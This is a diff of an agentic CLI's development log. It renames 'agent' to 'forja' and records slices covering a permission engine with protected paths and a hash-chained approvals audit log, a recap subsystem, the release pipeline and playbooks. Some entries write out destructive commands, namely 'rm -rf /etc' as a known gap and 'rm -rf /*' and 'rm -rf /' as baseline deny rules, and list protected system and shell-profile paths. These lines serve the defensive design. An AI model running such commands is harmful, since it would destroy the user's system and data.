+- **Quarantine surfaces only in verify, doesn't degrade.** Spec §7.2 calls it "quarantine flag em queries até inspeção" — query-level, not engine-level. Engine boots normally on the rotated chain; the operator sees the banner the next time they run `verify`. A future slice can add `forja permission inspect <rotation_id>` to clear the flag interactively; for now the SQL is documented in the verify output.
 - **`GENESIS-ROTATED:` prefix is distinct, not just a hash with shifted inputs.** Two reasons: (1) raw-row forensic inspection — scanning `prev_hash` columns in a DB browser, you can SEE the boundary without joining; (2) parser determinism — a downstream tool that wants to detect "is this a rotated chain" doesn't need the matching identity file (which it might not have).
 - **Composite primary key `(install_id, archive_rotation_id, seq)` on the archive table.** The live `approvals_log.seq` is AUTOINCREMENT global — a fresh INSERT after rotation continues from the last sqlite_sequence value, not 1. Preserving `seq` in the archive keeps the original row identity stable for replay; the composite PK distinguishes archived segments without collapsing two installs' rotations.
-- **`getLatestChainMeta` is read EVERY verifyChain call.** Cost is one indexed seek; benefit is correctness for the `agent permission verify` flow that constructs a fresh sink (which would also read at construction, but doing it again in verify is belt-and-braces against future code paths that long-live a sink across rotations).
+- **`getLatestChainMeta` is read EVERY verifyChain call.** Cost is one indexed seek; benefit is correctness for the `forja permission verify` flow that constructs a fresh sink (which would also read at construction, but doing it again in verify is belt-and-braces against future code paths that long-live a sink across rotations).
 - **`appendApprovalsLog.seq` does NOT reset on rotation.** Spec says "novo seq 1" — interpreted operationally as "the first row of the new chain semantically," not "literal value of the seq column." The identity of the new chain is the `prev_hash = GENESIS-ROTATED:...` of its first row, not the seq number. Resetting `sqlite_sequence` is global per-table and would affect concurrent installs in multi-tenant DBs.
 - **Drive-by: 4 verifyChain return-shape stubs in `tests/cli/repl{,-history}.test.ts`, `tests/conformance/index.ts`, and `tests/permissions/{engine,audit}.test.ts` updated to include the two new VerifyResult fields. The `bootstrap-engine.ts` refusing-branch default builds the same shape. These are mechanical type-shape updates that fall out of the VerifyResult widening.
 
@@ -20917,9 +22221,9 @@ Successor slices (still in spec order):
 1. Subagent intersection formal (§10).
 2. Sandbox plan integration (bwrap profile selection, §6.5).
 3. Context-summary builder for the classifier input.
-4. Replay tool (`agent permission replay`).
+4. Replay tool (`forja permission replay`).
 5. `--accept-broken-chain` operator override (§7.2 second flag, complementary to rotate-chain).
-6. `agent permission inspect <rotation_id>` (clears the quarantine flag after operator review).
+6. `forja permission inspect <rotation_id>` (clears the quarantine flag after operator review).
 
 ---
 
@@ -20979,7 +22283,7 @@ Successor slices (still in spec order):
 2. Subagent intersection formal (§10).
 3. Sandbox plan integration (bwrap profile selection, §6.5).
 4. Context-summary builder for the classifier input.
-5. Replay tool (`agent permission replay`).
+5. Replay tool (`forja permission replay`).
 
 ---
 
@@ -21048,7 +22352,7 @@ Successor slices (in spec order):
 3. Subagent intersection formal.
 4. Sandbox plan integration (bwrap profile selection).
 5. Context-summary builder for the classifier input.
-6. Replay tool (`agent permission replay`).
+6. Replay tool (`forja permission replay`).
 
 ---
 
@@ -21325,10 +22629,10 @@ The v2 spec lists 23 areas. Three were defensible as the first slice (state mach
 | File | Change |
 |---|---|
 | `docs/spec/PERMISSION_ENGINE.md` | New (was untracked at branch start). Authoritative spec for v2 — referenced by every later slice. Committed before the implementation lands. |
-| `src/permissions/protected_paths.ts` | New. Hardcoded list per spec §11 with two-tier semantics: `deny` (`/proc`, `/sys`, `/boot`, `/dev`, `.git`, `.agent`, `.claude` for writes) vs `escalate` (`/etc`, `~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.bash_profile`, `~/.config/agent`, `~/.config/claude`). `classify(absPath, op)` returns `'deny' \| 'escalate' \| null`. |
+| `src/permissions/protected_paths.ts` | New. Hardcoded list per spec §11 with two-tier semantics: `deny` (`/proc`, `/sys`, `/boot`, `/dev`, `.git`, `.forja`, `.claude` for writes) vs `escalate` (`/etc`, `~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.bash_profile`, `~/.config/forja`, `~/.config/claude`). `classify(absPath, op)` returns `'deny' \| 'escalate' \| null`. |
 | `src/permissions/engine.ts` | `checkPath` consults `classify` after rule lookup. Tier `deny` overrides any rule (defense in depth). Tier `escalate` upgrades `allow` → `confirm` (never downgrades a `deny`). Bash-side `rm`/`rmdir` enforcement is deferred to the bash-AST resolver slice — explicitly called out as a known gap. |
 | `src/permissions/config.ts` | `parsePolicy` rejects allow/confirm patterns that cover protected paths. Heuristic: any literal that resolves to a prefix of a protected path is rejected with `'protected_paths_redefined'`. |
-| `src/permissions/install_id.ts` | New. `ensureInstallId(env)` reads/writes `~/.config/agent/install_id` as JSON `{install_id, created_at_ms}`, mode 0600. Idempotent. |
+| `src/permissions/install_id.ts` | New. `ensureInstallId(env)` reads/writes `~/.config/forja/install_id` as JSON `{install_id, created_at_ms}`, mode 0600. Idempotent. |
 | `src/permissions/paths.ts` | `installIdPath()` analogous to `userPolicyPath`. |
 | `src/permissions/canonical.ts` | New. Hand-rolled canonical JSON encoder (RFC 8785 essentials: lex-sorted keys, no whitespace, no trailing comma). ~40 LOC, no external dep. |
 | `src/permissions/audit.ts` | New. `AuditSink` interface (`emit(decision, ctx)`, `verifyChain()`). `createSqliteSink(db, opts)` bumps a per-install monotonic seq, computes `this_hash = sha256(prev_hash ‖ canonical_row)` (`prev_hash` for seq=1 is the genesis derived from `install_id ‖ created_at_ms`). `verifyChain` walks 1..N, recomputes, returns `{ ok, brokenAt? }`. |
@@ -21339,7 +22643,7 @@ The v2 spec lists 23 areas. Three were defensible as the first slice (state mach
 | `src/permissions/index.ts` | Re-exports the new surface (`audit`, `install_id`, `canonical`, `protected_paths`, `ParsePolicyContext`, `installIdPath`). |
 | `src/storage/index.ts` | Re-exports `approvals-log` repo functions and types alongside the existing `approvals` repo (the v1 table remains untouched). |
 | `src/cli/args.ts` | New `permission?: { verb; positionals }` field on `ParsedArgs` + `parsePermissionSubcommand`. Accepts `verify` verb today; unknown verbs fail parse with a help-style error. |
-| `src/cli/permission-verify.ts` | New. `agent permission verify` walks `approvals_log` for the active install_id, prints `intact (N rows)` or `BROKEN at seq M` plus expected/actual hashes. Exit code 0 / 1. `--json` toggles single-line NDJSON form for hooks/CI. |
+| `src/cli/permission-verify.ts` | New. `forja permission verify` walks `approvals_log` for the active install_id, prints `intact (N rows)` or `BROKEN at seq M` plus expected/actual hashes. Exit code 0 / 1. `--json` toggles single-line NDJSON form for hooks/CI. |
 | `src/cli/run.ts` | Wires the `permission verify` subcommand alongside `--explain-permissions` and `--list-sessions`. |
 | `tests/permissions/protected_paths.test.ts` | New. 34 tests: deny tier per system root, escalate tier per path category, look-alike segment boundaries, supplied-home/cwd honored. |
 | `tests/permissions/canonical.test.ts` | New. 26 tests: primitives, escape sequences, key ordering (UTF-16 code unit), chain determinism, sha256/canonicalHash invariants. |
@@ -21371,7 +22675,7 @@ The v2 spec lists 23 areas. Three were defensible as the first slice (state mach
 - **Audit sink at production bootstrap.** `EngineOptions.audit` accepts a sink; this slice plumbed the sink type through and made the engine emit. Production `bootstrap.ts` still constructs the engine without a sink (default no-op). Wiring the real sink is one short follow-up: pass `createSqliteSink({ db, identity })` + `sessionId` + `home` into `createPermissionEngine`. Deliberately split because the engine-side change is what needed conformance + isolation; the bootstrap call site is a 5-line stitching change that earns more value when paired with the state-machine slice (which gates engine startup behind `verifyChain` anyway).
 - **Hot reload (§12.3).** The engine reads `policy` once at construction. File-watch + swap is its own slice.
 - **Sealing externo (§7.3).** Documented; chain alone shipped this slice.
-- **Bash-side protected paths.** `rm -rf /etc` via the bash tool consults `tools.bash`, not `tools.write_file`. Closing the gap needs the bash AST resolver (§5.2). Today's mitigation is the `agent init` baseline deny list (`rm -rf /*`, `rm -rf /`) — known limitation in this entry; closed by the bash-resolver slice.
+- **Bash-side protected paths.** `rm -rf /etc` via the bash tool consults `tools.bash`, not `tools.write_file`. Closing the gap needs the bash AST resolver (§5.2). Today's mitigation is the `forja init` baseline deny list (`rm -rf /*`, `rm -rf /`) — known limitation in this entry; closed by the bash-resolver slice.
 
 ### Decisions
 
@@ -21381,7 +22685,7 @@ The v2 spec lists 23 areas. Three were defensible as the first slice (state mach
 - **Two-tier protected paths, no third "warn" tier.** Spec §11 is binary (`deny direto` vs `escala pra confirm no mínimo`). Adding a "warn but allow" tier is feature creep; operators who want a soft signal can drop their own warn-style rules in the policy. The two-tier mapping matches the spec table verbatim.
 - **Bash-side protected-path enforcement deferred.** A `bash` tool call running `rm -rf /etc` doesn't pass through `checkPath` — it consults the bash policy. Catching that needs the bash-AST resolver from §5.2 which is its own slice. Logged as known limitation in this entry; closed by the bash resolver slice.
 - **Audit sink is opt-in via `EngineOptions.audit`.** Tests build engines without it (default no-op sink) to avoid the SQLite tax. Production bootstrap will inject the real sink in a follow-up. Mirrors how `provenance` is optional and keeps the engine pure-function-friendly for unit tests.
-- **`agent permission verify` lands minimal.** Just integrity check + exit code. The richer replay tool (spec §17 with `--against-current-policy`, `--without-classifier`, diff modes) is a separate slice — it depends on args being persisted in the session DB (which v1 doesn't do reliably yet) and on `policy_archive` for cross-version replay.
+- **`forja permission verify` lands minimal.** Just integrity check + exit code. The richer replay tool (spec §17 with `--against-current-policy`, `--without-classifier`, diff modes) is a separate slice — it depends on args being persisted in the session DB (which v1 doesn't do reliably yet) and on `policy_archive` for cross-version replay.
 - **Sealing externo (worm/rfc3161/s3) deferred.** Spec §7.3 documents it as opt-in for regulated deployment. Local-CLI ships the chain alone and earns most of the value (parcial-edit detection); sealing closes the residual root-level adversary class which is fora do escopo de §20.
 - **State machine `init`/`loading`/`ready`/`refusing` not in this slice.** A broken chain *will* set a flag in the audit sink's verify result and a future state machine slice consults it. For now, `verifyChain` returns `{ ok: false, brokenAt }` and the bootstrap or operator must act on it. Clean separation.
 - **§11 redefinition validator is conservative.** `parsePolicy` flags only patterns that target a protected path WITHOUT relying on engine-wide catch-alls (`/etc/hosts`, `/etc/**`, `/proc/...`, `~/.bashrc`). `/**` and `**` legitimately cover the whole filesystem and stay valid — the runtime classifier handles their matches against protected targets at decision time. Flagging catch-alls would break the common "allow under cwd" pattern operators write today.
@@ -21438,7 +22742,7 @@ Successor slices (in spec order, defensive ordering):
 
 - **`bunx` cyclonedx integrity hash** — moot now: SBOM is hand-rolled, no external tool fetch. Closed.
 - **Cosign keyless signing** — `release.yml` carries `id-token: write` reservation; signing step lands when keys / OIDC policy are decided.
-- **`agent --version --verify`** — needs the cosign signature first.
+- **`forja --version --verify`** — needs the cosign signature first.
 - **Homebrew tap** — separate repo + formula bump-PR step.
 - **Linux musl** — explicit pull-in signal in `PERFORMANCE.md §18.2.2`.
 
@@ -21516,7 +22820,7 @@ Budgets sit ~9-10% above the current baseline so:
 
 ## [2026-05-10] m4/distribution — release pipeline (build flags, cross-platform matrix, size gate, SHA256SUMS, reproducible build, SBOM, release workflow, install script, UPX compress)
 
-**Done:** Closes the "Distribuição binário Bun" item from M4 roadmap (`AGENTIC_CLI.md §18`). One slice, eight commit-sized deliverables under a single branch (`feat/m4-distribution`); user requested same-branch commits. Scope confirmed up front: items 1-7, 10, 12 of `PERFORMANCE.md §18` + `SECURITY_GUIDELINE.md §7.2` (build flags, matrix, size gate, SHA256, reproducible build, SBOM, release workflow, install script, UPX). Out of scope (deferred): cosign signing (#9), `agent --version --verify` (#8), Homebrew tap (#11) — they need infra (cosign keys, second repo) that doesn't yet exist.
+**Done:** Closes the "Distribuição binário Bun" item from M4 roadmap (`AGENTIC_CLI.md §18`). One slice, eight commit-sized deliverables under a single branch (`feat/m4-distribution`); user requested same-branch commits. Scope confirmed up front: items 1-7, 10, 12 of `PERFORMANCE.md §18` + `SECURITY_GUIDELINE.md §7.2` (build flags, matrix, size gate, SHA256, reproducible build, SBOM, release workflow, install script, UPX). Out of scope (deferred): cosign signing (#9), `forja --version --verify` (#8), Homebrew tap (#11) — they need infra (cosign keys, second repo) that doesn't yet exist.
 
 | Slice | File(s) | What |
 |---|---|---|
@@ -21563,8 +22867,8 @@ The size gate ships with the spec numbers as written. CI on this PR will fail th
 
 **Pending — out-of-scope items:**
 
-- **Cosign keyless signature** (`SECURITY_GUIDELINE.md §7.2`). Workflow has `id-token: write` reserved for it; the actual `cosign sign-blob` step + `cosign verify-blob` in `agent --version --verify` is a follow-up.
-- **`agent --version --verify`** flag. Needs the cosign signature first; without it `--verify` would only confirm the SHA against `SHA256SUMS` (which the install script already does at install time — a runtime re-check buys little).
+- **Cosign keyless signature** (`SECURITY_GUIDELINE.md §7.2`). Workflow has `id-token: write` reserved for it; the actual `cosign sign-blob` step + `cosign verify-blob` in `forja --version --verify` is a follow-up.
+- **`forja --version --verify`** flag. Needs the cosign signature first; without it `--verify` would only confirm the SHA against `SHA256SUMS` (which the install script already does at install time — a runtime re-check buys little).
 - **Homebrew tap** (`homebrew-forja` repo). Needs the second repo created; formula updates would be a release-workflow step (`brew bump-formula-pr` or equivalent).
 
 **Verification:**
@@ -21572,7 +22876,7 @@ The size gate ships with the spec numbers as written. CI on this PR will fail th
 - `bun run typecheck` — pass
 - `bun run lint` — pass (2 pre-existing warnings in `tests/harness/abortable.test.ts`, untouched)
 - `bun test` — 4600 pass / 10 skip / 0 fail (42 of those are the new `tests/scripts/` cases)
-- `bun run build` (single-target host build) — produces `dist/agent-linux-x64`, 99 MiB
+- `bun run build` (single-target host build) — produces `dist/forja-linux-x64`, 99 MiB
 
 **Next:** PR review. The size-gate divergence is the load-bearing decision the user needs to make before a release tag is cut.
 
@@ -21692,7 +22996,7 @@ SLO benchmark in `evals/bench/perf/recap-projection.ts`.
 ## [2026-05-09] m4.2/recap — fix headless dispatch gate
 
 **Done:** Discovered while validating round-2 fixes against a real
-session: `agent recap session <id> --json` was rejected by the
+session: `forja recap session <id> --json` was rejected by the
 entry-level prompt gate in `src/cli/index.ts` with
 `"--json requires a prompt (REPL mode is TTY only)"`, and the no-
 `--json` form fell into the TTY gate. The `promptOptional` list at
@@ -21715,7 +23019,7 @@ file.
 | Add `args.recap !== undefined` to `promptOptional`. One-line semantic fix. | `src/cli/index.ts` |
 | Two regression tests spawning the real binary: `recap session <id> --json` (covers the `--json requires a prompt` path) and the same without `--json` (covers the TTY gate fall-through). Both expect the dispatch to reach `runRecapHeadless` and surface the `/recap:` error prefix from there. | `tests/cli/index.test.ts` |
 
-**Validation:** Before fix — `agent recap session $REAL_ID --json`
+**Validation:** Before fix — `forja recap session $REAL_ID --json`
 prints "--json requires a prompt" + general usage. After fix —
 emits the §9 four-event NDJSON envelope. Real-session smoke
 covered all 6 renderers (`human` / `pr` / `changelog` / `slack` /
@@ -21736,7 +23040,7 @@ production: a sessão real with `tokensIn=8, cached=24217` rendered
   to a function) noisy if it loses one mode.
 
 **Next:** None — recap subsystem now usable end-to-end from CI and
-shell scripts (the actual reason `agent recap` exists per RECAP §9).
+shell scripts (the actual reason `forja recap` exists per RECAP §9).
 
 ---
 
@@ -21925,7 +23229,7 @@ programmatic engine-side wiring is a follow-up).
 
 **Next:** Slice (f) opens auto-rehydrate consumer (RECAP §3.2 +
 STATE_MACHINE §7.6). Re-injects `goal.text` + last 5
-`decisions[]` + `notDone[]` on `agent --resume`.
+`decisions[]` + `notDone[]` on `forja --resume`.
 
 ---
 
@@ -22056,18 +23360,18 @@ those scopes and adds the `--all-projects` privacy flag (§6.1).
 
 ---
 
-## [2026-05-09] m4.2d/recap — slice (d): headless NDJSON `agent recap`
+## [2026-05-09] m4.2d/recap — slice (d): headless NDJSON `forja recap`
 
-**Done:** RECAP §9 headless surface. `agent recap [args]` runs
+**Done:** RECAP §9 headless surface. `forja recap [args]` runs
 the recap pipeline without entering the REPL; `--json` toggles
 the four-event NDJSON envelope (`recap_start` /
 `recap_intermediate` / `recap_render` / `recap_end`). Destrava CI
-usage: `agent --json recap pr session <id> | jq '.output'`,
-`gh pr create --body "$(agent recap pr --no-llm-render)"`, etc.
+usage: `forja --json recap pr session <id> | jq '.output'`,
+`gh pr create --body "$(forja recap pr --no-llm-render)"`, etc.
 
 | Piece | Files |
 |---|---|
-| `agent recap [args]` subcommand parser. Mirrors the `init` shape: verb-first, recap-side flags forwarded verbatim to the slash parser. `--json` consumed at the subcommand boundary so the slash parser does not see it as a renderer flag. | `src/cli/args.ts`, `tests/cli/args.test.ts` |
+| `forja recap [args]` subcommand parser. Mirrors the `init` shape: verb-first, recap-side flags forwarded verbatim to the slash parser. `--json` consumed at the subcommand boundary so the slash parser does not see it as a renderer flag. | `src/cli/args.ts`, `tests/cli/args.test.ts` |
 | `runRecapSession` extracted from the slash exec body — a reusable function that returns the structured result (intermediate + output + audit metadata). The slash `recapCommand.exec` is now a thin wrapper. Headless calls `runRecapSession` directly so the intermediate is available to emit `recap_intermediate` without re-projecting. | `src/cli/slash/commands/recap.ts` |
 | `runRecapHeadless` — entry point. Routes `list` to `runRecapList` (multi-row NDJSON), every other form to `runRecapSession` (four-event NDJSON when `--json`, plain rendered text otherwise). Builds a minimal `SlashContext` (real DB + provider, stub for everything else); forwards `warn` / `error` bus events to stderr. | `src/cli/recap-headless.ts` |
 | `cli/run.ts` dispatch routes `args.recap` to `runRecapHeadless` after `--list-sessions` and `--explain-permissions`. Stub provider with `constrained: false` — LLM render falls back to deterministic until the real bootstrap is wired in. | `src/cli/run.ts` |
@@ -22101,7 +23405,7 @@ usage: `agent --json recap pr session <id> | jq '.output'`,
 - **Subcommand discriminator (`init`-style verb)**, not
   `--json /recap pr` shorthand. The spec wording suggested the
   shorthand but the implementation matches the dispatch shape
-  every other CLI verb already uses (`agent init`, `agent
+  every other CLI verb already uses (`forja init`, `agent
   recap`). Operators muscle-memory matches `git`/`gh`-style
   subcommands; the shorthand can be added later as an alias if
   the operator-facing UX wants it.
@@ -22109,7 +23413,7 @@ usage: `agent --json recap pr session <id> | jq '.output'`,
 **Pending:**
 - LLM-headless bootstrap. Today the dispatch in `cli/run.ts`
   passes a `constrained:false` stub; an operator running
-  `agent recap pr` headless gets the deterministic path even
+  `forja recap pr` headless gets the deterministic path even
   with `ANTHROPIC_API_KEY` set. Wiring the real provider via
   `bootstrap` is straightforward but adds a dependency this
   slice intentionally skipped.
@@ -22189,7 +23493,7 @@ metadata in NDJSON or table form.
   CHECK + record list invocations with the matched session ids).
 
 **Next:** Slice (d) opens headless NDJSON
-(`agent --json /recap`) — destrava CI usage of the recap surface.
+(`forja --json /recap`) — destrava CI usage of the recap surface.
 
 ---
 
@@ -22242,7 +23546,7 @@ Closes the M4.2 LLM-render coverage of all five renderers.
 **Pending:** the c-quick slice closes 3 of 8 items from the
 audit. Still open in subsequent slices:
 - (c-mini) — `recap_mini` schema + Stop hook + `/recap list` + picker
-- (d) — headless NDJSON `agent --json /recap`
+- (d) — headless NDJSON `forja --json /recap`
 - (e) — M4.3 cross-session (`/recap day`, `range`, `pre-compact`,
   `--all-projects`) + 10 fixtures + consistency metric
 - (f) — auto-rehydrate consumer no `--resume`
@@ -22398,7 +23702,7 @@ LLM render path for `/recap pr` with a production-grade pipeline
 reusing the LLM machinery; they each need a schema + template +
 prompt + 5 goldens + their own slot in the slash command. Slice
 (c) — `recap_mini` schema + Stop hook + `/recap list` for the
-session picker. Slice (d) — headless `agent --json /recap`.
+session picker. Slice (d) — headless `forja --json /recap`.
 Slice (a) does NOT block any of them; they all import from the
 machinery built here.
 
@@ -22562,7 +23866,7 @@ subsequent matching calls allow without prompting.
 
 | Change | Where | Why |
 |---|---|---|
-| `addSessionAllow(section, pattern)` on `PermissionEngine` interface + closure-backed `Map<sectionKey, string[]>` | `src/permissions/engine.ts` | The mutation point. Append-only, deduped, trims whitespace, refuses empty patterns. In-memory only — vanishes on process exit (persisting session rules into `.agent/permissions.yaml` is a separate slice — Tier 5 `/perms commit`). |
+| `addSessionAllow(section, pattern)` on `PermissionEngine` interface + closure-backed `Map<sectionKey, string[]>` | `src/permissions/engine.ts` | The mutation point. Append-only, deduped, trims whitespace, refuses empty patterns. In-memory only — vanishes on process exit (persisting session rules into `.forja/permissions.yaml` is a separate slice — Tier 5 `/perms commit`). |
 | Session-allow check threaded into `checkBash` / `checkPath` / `checkFetch` between deny and base allow | `src/permissions/engine.ts` | Order: deny (always wins) → session-allow (operator's runtime override) → compound guard (bash only) → base allow → base confirm → default-deny. Session-allow shortcuts past compound guard intentionally — operator already saw the modal once for that literal compound and explicitly authorized; the safety net was the first-time prompt. Decision carries `source.layer = 'session'` so `/perms why` and the modal attribute the rule to the runtime override, not the layer the section originally lived in. |
 | Bridge promotes on `answer === 'session-allow'` when subagent absent AND source has both `rule` + `section` (and section is a known `keyof PolicyToolsSection`) | `src/cli/repl.ts` | Synthesized confirms (compound-command guard, missing-arg rejections) carry no source.rule — those fall back to one-shot allow, matching option 1 behavior. Subagent-proxied requests skip promotion entirely: the child engine is built from `policySnapshot = parent.policy()` (subagent runtime), and `policy()` does NOT include session rules — they live in the parent closure's Map. Promoting onto parent on a child confirm would write a rule the child never sees, so the child re-prompts on every step while the parent's engine accrues inert state. Subagent session-allow needs both IPC source marshaling AND a child-engine push-down; tracked as a separate slice. |
 | `isPolicySectionKey` runtime guard | `src/cli/repl.ts` | `PolicySource.section` is typed `string` (loose for forward compat). Bridge needs a runtime allowlist before calling `addSessionAllow` — defense against a future engine that emits a section name we can't promote. |
@@ -22785,8 +24089,8 @@ longer block shipping.
 **Done:** Closes the Slice B punch list — the harness loop now
 flows the operator through a real modal, persists every critique
 decision to `critique_runs`, ships a deterministic eval suite, and
-honors `[critique]` in `~/.config/agent/config.toml` /
-`<cwd>/.agent/config.toml`. The harness is fully usable in
+honors `[critique]` in `~/.config/forja/config.toml` /
+`<cwd>/.forja/config.toml`. The harness is fully usable in
 production: an operator who sets `mode = "on_writes"` in their
 config gets the gate, the modal, and the audit trail end-to-end.
 
@@ -22834,7 +24138,7 @@ config gets the gate, the modal, and the audit trail end-to-end.
 
 | File | What |
 |---|---|
-| `src/critique/config-loader.ts` | NEW `loadCritiqueConfig({ cwd, registry, env, factoryOptions })` reads `[critique]` from two layers: user (`~/.config/agent/config.toml`, XDG-honoring) and project (`<cwd>/.agent/config.toml`). Project overrides user, both override `DEFAULT_CRITIQUE_CONFIG`. Per-field merge so a project file that only tweaks `threshold` keeps the user-level mode in effect. Resolves `model = "..."` against the registry to a `Provider`; unknown id surfaces a warning + null provider (fallback to executor at the loop layer). Accepts both snake_case (spec convention) and camelCase (API convention) keys. Non-fatal: malformed TOML, invalid mode, out-of-range threshold all degrade to defaults with a warning. |
+| `src/critique/config-loader.ts` | NEW `loadCritiqueConfig({ cwd, registry, env, factoryOptions })` reads `[critique]` from two layers: user (`~/.config/forja/config.toml`, XDG-honoring) and project (`<cwd>/.forja/config.toml`). Project overrides user, both override `DEFAULT_CRITIQUE_CONFIG`. Per-field merge so a project file that only tweaks `threshold` keeps the user-level mode in effect. Resolves `model = "..."` against the registry to a `Provider`; unknown id surfaces a warning + null provider (fallback to executor at the loop layer). Accepts both snake_case (spec convention) and camelCase (API convention) keys. Non-fatal: malformed TOML, invalid mode, out-of-range threshold all degrade to defaults with a warning. |
 | `src/critique/index.ts` | Re-exports the loader + types. |
 | `src/cli/bootstrap.ts` | Wires `loadCritiqueConfig` after the executor provider is built, sharing the registry. Plumbs the resolved `config` into `HarnessConfig.critique` and the optional `critiqueProvider`. New `BootstrapResult.critiqueWarnings: readonly string[]` so the CLI driver can render to stderr. |
 | `tests/cli/repl-history.test.ts` + `tests/cli/repl.test.ts` | Updated BootstrapResult fixtures with `critiqueWarnings: []`. |
@@ -23077,7 +24381,7 @@ output, only the critic's hint reaches the next turn).
   fixtures with clean output (must not invent issues),
   threshold tuning baseline.
 - **Operator config loader.** TOML at
-  `~/.config/agent/config.toml` (`[critique] mode = "on_writes"`
+  `~/.config/forja/config.toml` (`[critique] mode = "on_writes"`
   etc). Today the only path to enable critique is programmatic
   via `HarnessConfig.critique`; the CLI bootstrap doesn't read
   the TOML.
@@ -23325,14 +24629,14 @@ From the M4.1 self-review; commits `99a4f35`..`483dc45` plus the
   loads in <50ms.
 - **`/recap list [filtros]`** slash command — depends on
   `recap_mini`.
-- **Headless mode `agent --json /recap`** (RECAP.md §9) —
+- **Headless mode `forja --json /recap`** (RECAP.md §9) —
   emits NDJSON: `recap_start`, `recap_intermediate`,
   `recap_render`, `recap_end`. Useful in CI hooks.
 - **Eval coverage for the LLM renderer** (RECAP.md §7.4) —
   fidelity / coverage / concision / consistency metrics.
   Threshold: fidelity 100%, coverage ≥90%, concision 100%.
 - **Auto-rehydrate consumer** for resume (RECAP.md §3.2 +
-  STATE_MACHINE.md §7.6). On `agent --resume`, re-inject
+  STATE_MACHINE.md §7.6). On `forja --resume`, re-inject
   `goal.text` literal + last 5 `decisions[]` + `notDone[]`.
   Read from `recap_cache` if present, fall back to
   deterministic projection of `RecapIntermediate` directly
@@ -23384,7 +24688,7 @@ From the M4.1 self-review; commits `99a4f35`..`483dc45` plus the
 
 ### Operational gaps
 
-- **No CI integration sample.** `agent --json /recap pr
+- **No CI integration sample.** `forja --json /recap pr
   --out PR_DESCRIPTION.md` is mentioned in spec §9 as the
   canonical postcommit hook — needs an example doc once
   M4.2 ships the `pr` renderer.
@@ -23949,7 +25253,7 @@ working", which the silent wait was not.
 
 ## [2026-05-07] non-`done` tool-end chips bypass the coalescing buffer
 
-Real-world bug from a fresh `dist/agent` run after slice 3 landed:
+Real-world bug from a fresh `dist/forja` run after slice 3 landed:
 operator typed "explore o projeto e me de hilights", saw the agent
 list memory, glob, then read 6 files (correctly coalesced as
 `Read 6 files in 81ms`). Then nothing for 51 seconds. After
@@ -24625,9 +25929,9 @@ follow-up because the fix is the step-stall detector
   still well below `refactor` ($2.00) and `audit` ($1.50).
 
   NOTE: this updates the install-time TEMPLATE only.
-  `.agent/agents/explain.md` (the operator's installed copy)
+  `.forja/playbooks/explain.md` (the operator's installed copy)
   is gitignored — operators with an existing install must
-  re-run `agent init --playbooks` or edit the file manually
+  re-run `forja init --playbooks` or edit the file manually
   to pick up the new cap.
 
 **Verification:** `bun test` 3616 pass / 0 fail · `bun run
@@ -25077,7 +26381,7 @@ paths outside the operator's explicit grant.
 - `bootstrap.ts` computes `isRepoRootTrusted` next to the existing
   `isCwdTrusted`. When `cwd === repoRoot` the second `isTrusted`
   call short-circuits to the same value — no redundant probe.
-- Common workflow (operator trusts the whole repo, runs `agent`
+- Common workflow (operator trusts the whole repo, runs `forja`
   from a subdir): both flags true, fallback works as before.
   Narrow workflow (operator trusts only the subdir): repoRoot
   fallback skipped, no pointer emitted, system prompt's path
@@ -25945,7 +27249,7 @@ existing subagent runtime. Closes every load-bearing field
 `PLAYBOOKS.md` §1.1 declares (typed at load time, snapshot-
 persisted at spawn, applied at child-side composition) and
 ships the operator surface — slash auto-registration,
-`agent init --playbooks` distribution of the 10 canonical
+`forja init --playbooks` distribution of the 10 canonical
 .md files, eval fixture infrastructure. Branch
 `feat/playbooks` off `develop`; same-branch slices 1-10
 land as one cohesive subsystem cut.
@@ -25963,7 +27267,7 @@ import attribute.
 | 1 | `src/subagents/types.ts`, `src/subagents/load.ts` | Typed frontmatter for `outputSchema`, `references`, `toolRestrictions`, `slash`, `whenToUse`, `sampling`, `contextRecipe`, `promptVersion`, `contextRecipeVersion`, `phases`. Validators per field with source-aware errors; YAML→camelCase normalization; tool_restrictions list-shorthand collapses to `{allow}`. Loader's `meta` overflow now stays empty for canonical playbooks. |
 | 2 | `src/cli/playbook-prompt.ts`, `src/cli/bootstrap.ts` | Discovery preamble + alphabetical-by-name table of `\| name \| when_to_use \|`; cap 12 rows; `composeWithPlaybookHint` slots between parallel hint and plan/user. Defs without `whenToUse` skipped. |
 | 3 | `src/cli/slash/commands/playbook.ts`, `src/cli/slash/index.ts`, `src/cli/repl.ts` | `buildPlaybookSlashCommands` factory; `createBuiltinRegistry(subagents?)` appends them; collisions throw at construction. REPL provides `runPlaybook` bridge that calls `runSubagent` inline; output renders to scrollback. |
-| 4 | `src/cli/init-playbooks/*.md` (10), `src/cli/init.ts`, `src/cli/args.ts` | The 10 canonical playbooks in English, embedded via `with { type: 'text' }`. `agent init --playbooks` copies to `<cwd>/.agent/agents/`; skip-if-exists, `--force` overrides; per-file copied/overwritten/skipped report. |
+| 4 | `src/cli/init-playbooks/*.md` (10), `src/cli/init.ts`, `src/cli/args.ts` | The 10 canonical playbooks in English, embedded via `with { type: 'text' }`. `forja init --playbooks` copies to `<cwd>/.forja/playbooks/`; skip-if-exists, `--force` overrides; per-file copied/overwritten/skipped report. |
 | 5 | `src/subagents/restrictions.ts`, migration 024, `src/cli/subagent-child.ts` | Glob+prefix matcher (2-pointer backtrack), `enforceBashRestriction` / `enforcePathRestriction`, `wrapToolWithRestrictions(tool, restrictions)` middleware. Audit row carries `tool_restrictions`; child's tool registry wraps every tool. Refusal code `policy.tool_restricted`. |
 | 6 | `src/providers/{anthropic,openai,google}/index.ts`, `src/harness/{types,loop}.ts`, migration 025 | `GenerateRequest.top_p` / `thinking_budget` end-to-end. Anthropic maps thinking_budget to `thinking: {type:'enabled',budget_tokens}` (gates >0); Google to `thinkingConfig.thinkingBudget`; OpenAI passes top_p, drops thinking_budget (different surface — `reasoning.effort`). `HarnessConfig.topP` / `thinkingBudget` join the existing `temperature`. Audit row carries `sampling` snapshot; child applies temperature precedence (parent argv > playbook .md > provider default). |
 | 7 | `src/cli/reference-block.ts`, migration 026 | Trailing "References (read on demand)" block with `read_file` citation + explicit "do not embed eagerly" warning (PLAYBOOKS §13). `reference_paths` column avoids SQL keyword. Order preserved; null/empty/corrupt rows degrade to no-block. |
@@ -26017,7 +27321,7 @@ import attribute.
   `reasoning.effort` override to PLAYBOOKS §1.1; until then,
   drop > guess.
 
-- **D242 — `agent init --playbooks` skips by default.** Authors
